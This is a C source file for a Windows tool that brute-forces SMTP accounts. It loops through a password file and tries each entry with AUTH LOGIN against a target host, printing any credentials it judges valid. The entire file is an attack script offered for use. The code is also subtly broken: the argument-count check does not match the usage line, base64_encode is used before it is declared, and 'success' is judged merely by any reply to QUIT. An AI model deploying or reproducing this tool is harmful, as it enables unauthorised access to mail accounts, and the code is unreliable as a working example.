#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define MAX_BUF_SIZE 1024

// Function to initialize WinSock
int init_winsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return 0;
    }
    return 1;
}

// Function to create a socket and connect to the target SMTP server
SOCKET create_socket(const char *host, int port) {
    struct sockaddr_in server;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        return INVALID_SOCKET;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed\n");
        closesocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}

// Function to send and receive SMTP data
int smtp_send_receive(SOCKET sock, const char *message) {
    char buffer[MAX_BUF_SIZE];
    int bytes_received;

    send(sock, message, strlen(message), 0);
    memset(buffer, 0, sizeof(buffer));
    bytes_received = recv(sock, buffer, sizeof(buffer), 0);
    if (bytes_received > 0) {
        printf("Received: %s\n", buffer);
        return 1;
    }
    return 0;
}

// Function to try login with a username and password
int try_login(const char *host, int port, const char *username, const char *password) {
    SOCKET sock = create_socket(host, port);
    if (sock == INVALID_SOCKET) return 0;

    char buf[MAX_BUF_SIZE];

    // EHLO command
    if (!smtp_send_receive(sock, "EHLO test\r\n")) {
        closesocket(sock);
        return 0;
    }

    // AUTH LOGIN command
    snprintf(buf, sizeof(buf), "AUTH LOGIN\r\n");
    if (!smtp_send_receive(sock, buf)) {
        closesocket(sock);
        return 0;
    }

    // Send username (Base64 encoded)
    snprintf(buf, sizeof(buf), "%s\r\n", base64_encode(username));  // Encode username
    if (!smtp_send_receive(sock, buf)) {
        closesocket(sock);
        return 0;
    }

    // Send password (Base64 encoded)
    snprintf(buf, sizeof(buf), "%s\r\n", base64_encode(password));  // Encode password
    if (!smtp_send_receive(sock, buf)) {
        closesocket(sock);
        return 0;
    }

    // Check for successful login
    if (smtp_send_receive(sock, "QUIT\r\n")) {
        closesocket(sock);
        return 1; // Successful login
    }

    closesocket(sock);
    return 0; // Failed login
}

// Base64 encoding function
const char *base64_encode(const char *str) {
    static char base64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    static char encoded[1024];
    int len = strlen(str);
    int i, j = 0, val = 0, valb = -6;
    for (i = 0; i < len; i++) {
        val = (val << 8) + str[i];
        valb += 8;
        while (valb >= 0) {
            encoded[j++] = base64[(val >> valb) & 0x3F];
            valb -= 6;
        }
    }
    if (valb > -6) encoded[j++] = base64[((val << 8) >> valb) & 0x3F];
    while (j % 4) encoded[j++] = '=';
    encoded[j] = '\0';
    return encoded;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: brute.exe <host> <login> <password_file> <port>\n");
        return -1;
    }

    const char *host = argv[1];
    const char *username = argv[2];
    const char *password_file = argv[3];
    int port = atoi(argv[4]);

    // Initialize WinSock
    if (!init_winsock()) return -1;

    FILE *fp = fopen(password_file, "r");
    if (fp == NULL) {
        printf("Failed to open password file.\n");
        WSACleanup();
        return -1;
    }

    char password[MAX_BUF_SIZE];
    while (fgets(password, sizeof(password), fp) != NULL) {
        // Remove newline character
        password[strcspn(password, "\n")] = 0;

        printf("Trying password: %s\n", password);

        // Attempt login
        if (try_login(host, port, username, password)) {
            printf("Success! Username: %s, Password: %s\n", username, password);
            fclose(fp);
            WSACleanup();
            return 0;
        }
    }

    printf("Brute-force attempt failed. No valid login found.\n");
    fclose(fp);
    WSACleanup();
    return 0;
}
